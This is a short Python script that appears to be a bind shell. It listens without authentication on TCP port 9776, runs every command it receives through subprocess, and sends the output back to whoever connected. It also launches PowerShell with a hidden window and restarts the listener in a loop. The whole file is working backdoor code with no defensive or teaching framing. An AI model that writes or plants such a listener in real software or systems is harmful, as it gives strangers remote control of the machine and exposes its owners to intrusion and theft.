import socket
import os
import subprocess

ip = ""
port = 9776
queue = 1
timeout = 1
cc = "s_end" # server_end - command to off the server
splitter = '////////////////////\\\\\\\\\\\\\\\\\\\\'
def_shell_command = ""
dsc_spl = ""


def Start():
    global def_shell_command, dsc_spl


    msg = None

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        sock.bind((ip, port))
    except:
        print("binding error...")

    sock.listen(queue)

    sock2, info = sock.accept()

    print(info) 

    print('accepted...')


    while msg != cc:
        a = ""
        msg = ""
        print(splitter)

        try:
            print('waiting for command')
            msg = sock2.recv(1024).decode()
            print('after recv')
            print("tried")
            print(msg)
            if msg == "":
                print("Connection was refused by client... Reaccepting...")
                return -2
        except:
            print('could NOT')
            return -1

        if msg == "DSC":
            sock2.send('Set default shell command...'.encode())
            def_shell_command = sock2.recv(1024).decode()
            
            if def_shell_command == "":
                dsc_spl = ""
            else:
                dsc_spl = " "
            sock2.send(f'Now default shell is {def_shell_command}'.encode())
        else:
            #try:
            args = def_shell_command+dsc_spl+msg
            print(f'args === {args}')
            try:
                a = str(subprocess.run(args, stdout=subprocess.PIPE))
                print(a)
            except:
                sock2.send("Shell error... Check your command.".encode())

            sock2.send(a.encode())
            print(f'\ncommand === {msg} ===')
            print(splitter)



    sock.close()
    sock2.close()



    



    a = subprocess.run('Powershell.exe -WindowStyle hidden pwd', shell=True)
    print()
    print(a)





if __name__ == "__main__":

    RC = 1 # returned code
    while RC != 0:
        print("rc")
        RC = Start()

    print('eop')
